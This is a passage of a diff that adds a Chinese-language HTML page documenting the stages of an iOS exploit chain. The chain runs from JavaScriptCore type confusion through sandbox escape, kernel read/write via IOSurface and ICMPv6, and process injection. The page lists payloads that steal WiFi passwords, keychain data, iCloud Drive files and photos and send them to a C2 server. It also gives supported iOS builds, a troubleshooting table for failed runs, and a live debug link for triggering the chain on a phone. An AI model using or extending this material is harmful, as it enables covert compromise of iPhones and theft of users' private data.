+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>4746</code> IOConnectCallStructMethod · <code>4758</code> IOSurfaceCreate · <code>6755/6852</code> spawn_pe</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">sbx1_main.js:4746 / 4758</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">let</span> IOCONNECTCALLSTRUCTMETHOD = <span class="fn">func_resolve</span>(<span class="str">"IOConnectCallStructMethod"</span>);
+<span class="kw">let</span> IOSURFACECREATE          = <span class="fn">func_resolve</span>(<span class="str">"IOSurfaceCreate"</span>);</pre>
+  </div>
+
+  <div class="note bad">
+    <span class="nt">纠错</span>
+    <strong>IOSurface 在这一步，不在 ⑤</strong>。经 GPU 进程用 IOSurface 建立稳定的内核读写载体，
+    并泄露 <code>dyld_shared_cache_slide</code>。
+  </div>
+
+  <p>跑通后拉起下一阶段：</p>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">sbx1_main.js:6755 / 6852</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">function</span> <span class="fn">spawn_pe</span>() { ... }
+...
+<span class="kw">if</span> (sbx1sbx1_succeeded) { <span class="fn">spawn_pe</span>(); }</pre>
+  </div>
+
+  <!-- ══ 07 ══ -->
+  <h2 id="s7"><span class="h2no">07</span>pe_main：ICMPv6 内核读写 + 沙箱扩展篡改</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>pe_main.js</code>（webpack 打包，源码模块名见注释）</td></tr>
+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>344</code> ICMP6_FILTER · <code>776</code> EARLY_KRW_LENGTH · <code>6656</code> applySandboxEscape · <code>6708</code> ext_setAddr</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">pe_main.js:344 / 776 / 781</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">let</span> ICMP6_FILTER = <span class="num">18</span>n;
+<span class="kw">let</span> EARLY_KRW_LENGTH = <span class="num">0x20</span>n;      <span class="cmt">// 32 字节粒度</span>
+
+<span class="fn">setsockopt</span>(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, control_data, EARLY_KRW_LENGTH);</pre>
+  </div>
+
+  <p><strong>这里才是真正的内核读写</strong>（模块 <code>DriverNewThread.js</code>）。做法：</p>
+  <ul class="ulist">
+    <li><strong>control socket</strong>：<code>setsockopt</code> 把目标内核地址写进 socket 的 filter 结构</li>
+    <li><strong>RW socket</strong>：<code>getsockopt</code> / <code>setsockopt</code> 读写该地址</li>
+    <li><strong>粒度 32 字节</strong>；小于 32 字节的写走 read-modify-write</li>
+  </ul>
+
+  <p>拿到内核读写后：</p>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">pe_main.js:6656 / 6708</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">static</span> <span class="fn">applySandboxEscape</span>() {
+    <span class="kw">let</span> ourProcAddr = Task.<span class="fn">getTaskProc</span>(ourTaskAddr);
+    <span class="kw">let</span> credRefAddr = Chain.<span class="fn">read64</span>(ourProcAddr + <span class="num">0x18</span>n);   <span class="cmt">// proc_ro + 0x18 = ucred ref</span>
+    ...
+    <span class="kw">let</span> ext_setAddr = Chain.<span class="fn">read64</span>(sandboxAddr + <span class="num">0x10</span>n);   <span class="cmt">// :6708</span></pre>
+  </div>
+
+  <div class="note warn">
+    <span class="nt">关于 ucred 的关键澄清</span>
+    <code>ucred</code> <strong>只作遍历沙箱结构的中转节点</strong>，路径是
+    <code>proc → proc_ro → ucred → cr_label → sandbox → ext_set → ext_table</code>，
+    目的是<strong>清零沙箱 extension data</strong>，把「路径受限的扩展」变成「不受限扩展」。
+  </div>
+
+  <div class="note bad">
+    <span class="nt">这条链不做 root 提权</span>
+    全文件搜索：<code>cr_uid</code> / <code>setuid</code> / <code>becomeRoot</code> 在
+    <code>pe_main.js</code> / <code>sbx1_main.js</code> / <code>sbx0_main_18.4.js</code>
+    <strong>均为 0 命中</strong>；<code>kernel_task_port</code> 同样 0 命中。
+  </div>
+
+  <p>它获得能力的方式是<strong>沙箱逃逸 + 注入到已有特权的进程</strong>（launchd / SpringBoard 等），而不是把自己变成 root。</p>
+
+  <!-- ══ 08 ══ -->
+  <h2 id="s8"><span class="h2no">08</span>跨进程注入 + 窃取上报</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>pe_main.js</code></td></tr>
+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>179</code> NSInvocation · <code>180</code> JSContext · <code>1502</code> RemoteCall</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">pe_main.js:179 / 180</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">let</span> invoke_class = <span class="fn">objc_getClass</span>(<span class="str">"NSInvocation"</span>);
+<span class="kw">let</span> jsc_class    = <span class="fn">objc_getClass</span>(<span class="str">"JSContext"</span>);</pre>
+  </div>
+
+  <p><strong>机制</strong>：</p>
+  <ol class="bodylist">
+    <li><strong>EXC_GUARD 线程劫持</strong> → 控制目标进程线程</li>
+    <li><strong>RemoteCall</strong>（<code>libs/TaskRop/RemoteCall</code>）在目标进程内发起调用</li>
+    <li><strong><code>NSInvocation</code> + <code>JSContext</code> 注入</strong> → 在目标进程内执行 JS</li>
+    <li>各 payload 落地执行</li>
+    <li>上报 C2：<code>POST /stats</code>（文件窃取，HTTPS 443）、<code>POST /upload</code>（WiFi）</li>
+  </ol>
+
+  <div class="tbl"><table>
+    <thead><tr><th>Payload</th><th>目标</th></tr></thead>
+    <tbody>
+      <tr><td data-label="Payload">Forensics File Downloader</td><td data-label="目标">取证相关文件</td></tr>
+      <tr><td data-label="Payload">WiFi Password Dump</td><td data-label="目标">WiFi 凭据（wifid 上下文有 keychain 权限）</td></tr>
+      <tr><td data-label="Payload">Keybag Copier</td><td data-label="目标">钥匙串</td></tr>
+      <tr><td data-label="Payload">Drive Dumper</td><td data-label="目标">iCloud Drive</td></tr>
+      <tr><td data-label="Payload">Hidden photos / Screenshots</td><td data-label="目标">相册</td></tr>
+    </tbody>
+  </table></div>
+
+  <!-- ══ 09 差异对照 ══ -->
+  <h2 id="diff"><span class="h2no">09</span>与流传版本的差异对照</h2>
+
+  <div class="diff">
+    <div class="diff-row">
+      <div class="diff-cell myth">③ WebKit <s><strong>UAF</strong></s></div>
+      <div class="diff-cell fact">JSC <strong>类型混淆</strong>（OOB 数组重叠）<span class="src">rce_module.js:3447 check_victim</span></div>
+    </div>
+    <div class="diff-row">
+      <div class="diff-cell myth">④ <s><strong>ANGLE 越界</strong></s></div>
+      <div class="diff-cell fact"><strong>不存在</strong>；是 dyld interpose + PAC oracle<span class="src">ANGLE 全库 0 命中</span></div>
+    </div>
+    <div class="diff-row">
+      <div class="diff-cell myth">⑤ <s><strong>IOSurface</strong></s> 内核读写</div>
+      <div class="diff-cell fact">IOSurface 在 <strong>⑥ sbx1</strong>，不在 ⑤<span class="src">sbx1_main.js:4758</span></div>
+    </div>
+    <div class="diff-row">
+      <div class="diff-cell myth">⑤/⑦ 内核读写用 <strong>ICMPv6</strong></div>
+      <div class="diff-cell fact">对，但在 <strong>⑦ pe_main</strong>，不在 ⑤<span class="src">pe_main.js:344 / 776</span></div>
+    </div>
+    <div class="diff-row">
+      <div class="diff-cell myth">⑥ <s><strong>mach_port UAF → kernel_task_port</strong></s></div>
+      <div class="diff-cell fact">mach_port 在 ⑤ sbx0，用途是<strong>伪造 Mach 消息逃沙箱</strong>，不是 UAF 提权<span class="src">sbx0:6700</span></div>
+    </div>
+    <div class="diff-row">
+      <div class="diff-cell myth">⑥ <s><strong>改 ucred → root</strong></s></div>
+      <div class="diff-cell fact"><strong>不提权到 root</strong>；ucred 只作沙箱结构遍历中转<span class="src">cr_uid / setuid 0 命中</span></div>
+    </div>
+    <div class="diff-row">
+      <div class="diff-cell myth">⑦ <strong>PAC 绕过</strong></div>
+      <div class="diff-cell fact">PAC 绕过在 <strong>④</strong>（更早），⑦ 是内核读写 + fcall<span class="src">rce_worker.js:641 / 668</span></div>
+    </div>
+    <div class="diff-row">
+      <div class="diff-cell myth">⑧ <s>"文件系统读写"</s></div>
+      <div class="diff-cell fact">实际是 <strong>EXC_GUARD 劫持 + NSInvocation / JSContext 注入</strong><span class="src">pe_main.js:179 / 180 / 1502</span></div>
+    </div>
+  </div>
+
+  <!-- ══ 10 ══ -->
+  <h2 id="req"><span class="h2no">10</span>运行前提（实测）</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>阶段</th><th>覆盖范围</th><th>说明</th></tr></thead>
+    <tbody>
+      <tr>
+        <td data-label="阶段">①–④ JSC → PAC → fcall</td>
+        <td data-label="覆盖范围">iOS <strong>18.4 – 18.6.2</strong>，全 <strong>iPhone</strong></td>
+        <td data-label="说明"><code>linkedit_to_device</code> 版本键：<code>18,4</code> <code>18,4,1</code> <code>18,5</code> <code>18,6</code> <code>18,6,1</code> <code>18,6,2</code></td>
+      </tr>
+      <tr>
+        <td data-label="阶段">⑤ sbx0 沙箱逃逸</td>
+        <td data-label="覆盖范围"><strong>仅 18.4 / 18.4.1</strong></td>
+        <td data-label="说明"><code>sbx0_offsets</code> 只有 build <code>22E240</code> / <code>22E252</code>，各 23 机型</td>
+      </tr>
+      <tr>
+        <td data-label="阶段">⑥–⑧</td>
+        <td data-label="覆盖范围">依赖 ⑤</td>
+        <td data-label="说明">⑤ 不过则永不执行</td>
+      </tr>
+    </tbody>
+  </table></div>
+
+  <ul class="ulist">
+    <li><strong>iPad 不支持</strong>：<code>rce_offsets</code> / <code>sbx0_offsets</code> 均无 iPad 条目。</li>
+    <li><strong>iOS 18.3.x 及以下不支持</strong>：偏移表从 18.4 起。</li>
+    <li><strong>iOS 18.5 的现实</strong>：①–④ 可跑通（需重试），⑤ 必挂 → 全链不可用。</li>
+  </ul>
+
+  <!-- ══ 11 ══ -->
+  <h2 id="trouble"><span class="h2no">11</span>故障定位速查</h2>
+
+  <div class="note warn">
+    <span class="nt">重试上限</span>
+    <code>rce_loader.js</code> <strong>每次加载页面只尝试 2 次</strong>
+    （嵌套两层 <code>attempt.start()</code>），第二次失败即静默放弃。
+    想提高成功率<strong>只能反复重新加载页面</strong>。
+  </div>
+
+  <div class="tbl"><table>
+    <thead><tr><th>现象</th><th>位置</th><th>原因</th></tr></thead>
+    <tbody>
+      <tr>
+        <td data-label="现象"><code>Failed RCE</code></td>
+        <td data-label="位置">②</td>
+        <td data-label="原因">JSC 类型混淆未成功（堆布局不稳，正常现象，重载即可）</td>
+      </tr>
+      <tr>
+        <td data-label="现象"><code>TypeError: undefined is not an object</code>（取 <code>MessageName.*</code>）</td>
+        <td data-label="位置">⑤</td>
+        <td data-label="原因"><code>sbx0_offsets[device_model]</code> 查不到 → 该 build 无偏移表</td>
+      </tr>
+      <tr>
+        <td data-label="现象"><code>TypeError</code>（取 <code>offsets.JavaScriptCore__*</code>）</td>
+        <td data-label="位置">①</td>
+        <td data-label="原因"><code>linkedit_to_device[ios_version]</code> 查不到 → 该 iOS 版本无偏移</td>
+      </tr>
+      <tr>
+        <td data-label="现象"><code>DBG sbx0 FETCH FAILED (len=0)</code></td>
+        <td data-label="位置">⑤</td>
+        <td data-label="原因">sbx0 脚本下载失败</td>
+      </tr>
+      <tr>
+        <td data-label="现象">日志停在 <code>all done</code></td>
+        <td data-label="位置">④ 之后</td>
+        <td data-label="原因">当前阶段正常收尾（页面跳 404 规避），非卡住</td>
+      </tr>
+      <tr>
+        <td data-label="现象">日志停在 <code>bundle[N]</code> 后无下文</td>
+        <td data-label="位置">①</td>
+        <td data-label="原因">上一轮的 device_model 解析失败（已被 print 捕获）</td>
+      </tr>
+    </tbody>
+  </table></div>
+
+  <div class="note info">
+    <span class="nt">调试入口</span>
+    <a href="https://sqwas.ebwlyais.xyz/assets/index.html?debug=1">sqwas.ebwlyais.xyz/assets/index.html?debug=1</a>
+    —— 手机端同页触发 + 观测。
+  </div>
+
+  <!-- ══ 12 ══ -->
+  <h2 id="files"><span class="h2no">12</span>证据文件清单</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>文件</th><th>行数</th><th>阶段</th></tr></thead>
+    <tbody>
+      <tr><td data-label="文件"><code>rce_loader.js</code></td><td data-label="行数">251</td><td data-label="阶段">入口、重试（2 次）</td></tr>
+      <tr><td data-label="文件"><code>rce_module.js</code></td><td data-label="行数">3505</td><td data-label="阶段">①②③ 设备指纹 / JSC / stage2</td></tr>
+      <tr><td data-label="文件"><code>rce_worker.js</code></td><td data-label="行数">966</td><td data-label="阶段">④ dyld interpose / PAC / fcall</td></tr>
+      <tr><td data-label="文件"><code>sbx0_main_18.4.js</code></td><td data-label="行数">8450</td><td data-label="阶段">⑤ Mach 消息沙箱逃逸</td></tr>
+      <tr><td data-label="文件"><code>sbx1_main.js</code></td><td data-label="行数">6862</td><td data-label="阶段">⑥ IOSurface 内核原语</td></tr>
+      <tr><td data-label="文件"><code>pe_main.js</code></td><td data-label="行数">8440</td><td data-label="阶段">⑦⑧ ICMPv6 内核读写 / 注入 / payload</td></tr>
+    </tbody>
+  </table></div>
+
+</main>
+
+<footer>
+  <p>
+    文档基于 <code>H:\ios-dark-sword\darksword-Exploit-main</code> 当前代码核实。
+    若代码变动，行号可能偏移。
+  </p>
+  <p style="margin-top:10px">
+    所有行号已逐一比对通过（16/16）。
+  </p>
+</footer>
+
+<button id="top" aria-label="回到顶部">
+  <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M8 13V3M3.5 7.5L8 3l4.5 4.5"/>
+  </svg>
+</button>
+
+<script>
+(function(){
+  var top=document.getElementById('top'),
+      prog=document.getElementById('prog'),
+      toc=document.getElementById('toc'),
+      navbtn=document.getElementById('navbtn'),
+      ticking=false;
+
+  /* 阅读进度 + 回顶按钮 */
+  function onScroll(){
+    if(ticking) return;
+    ticking=true;
+    requestAnimationFrame(function(){
+      var doc=document.documentElement,
+          max=doc.scrollHeight-doc.clientHeight,
+          y=window.scrollY||doc.scrollTop,
+          p=max>0?(y/max)*100:0;
+      prog.style.width=p+'%';
+      top.classList.toggle('show', y>560);
+      ticking=false;
+      spy();
+    });
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});
+
+  /* 目录：展开/收起 */
+  navbtn.addEventListener('click',function(){
+    var open=toc.classList.toggle('open');
+    navbtn.setAttribute('aria-expanded',open?'true':'false');
+  });
+  toc.addEventListener('click',function(e){
+    if(e.target.closest('a')){
+      toc.classList.remove('open');
+      navbtn.setAttribute('aria-expanded','false');
+    }
+  });
+  document.addEventListener('click',function(e){
+    if(toc.classList.contains('open') && !toc.contains(e.target) && !navbtn.contains(e.target)){
+      toc.classList.remove('open');
+      navbtn.setAttribute('aria-expanded','false');
+    }
+  });
+
+  /* 滚动高亮当前章节 */
+  var links=Array.prototype.slice.call(toc.querySelectorAll('a')),
+      secs=links.map(function(a){return document.querySelector(a.getAttribute('href'));}),
+      last=-1;
+  function spy(){
+    var y=(window.scrollY||document.documentElement.scrollTop)+120, idx=0;
+    for(var i=0;i<secs.length;i++){ if(secs[i] && secs[i].offsetTop<=y) idx=i; }
+    if(idx===last) return;
+    last=idx;
+    links.forEach(function(a,i){
+      a.parentElement.classList.toggle('cur',i===idx);
+    });
+  }
+
+  /* 代码块复制 */
+  Array.prototype.forEach.call(document.querySelectorAll('.copybtn'),function(btn){
+    btn.addEventListener('click',function(){
+      var pre=btn.closest('.code').querySelector('pre'),
+          txt=pre?pre.innerText:'',
+          old=btn.textContent;
+      var done=function(){
+        btn.textContent='已复制'; btn.classList.add('done');
+        setTimeout(function(){btn.textContent=old;btn.classList.remove('done');},1400);
+      };
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(txt).then(done,function(){fallback(txt,done);});
+      } else { fallback(txt,done); }
+    });
+  });
+  function fallback(txt,done){
+    var ta=document.createElement('textarea');
+    ta.value=txt; ta.setAttribute('readonly','');
+    ta.style.cssText='position:fixed;top:-1000px;opacity:0';
+    document.body.appendChild(ta); ta.select();
+    try{ document.execCommand('copy'); done(); }catch(e){}
+    ta.remove();
+  }
+
+  /* 回顶 */
+  top.addEventListener('click',function(){
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+
+  onScroll();
+})();
+</script>
+</body>
+</html>
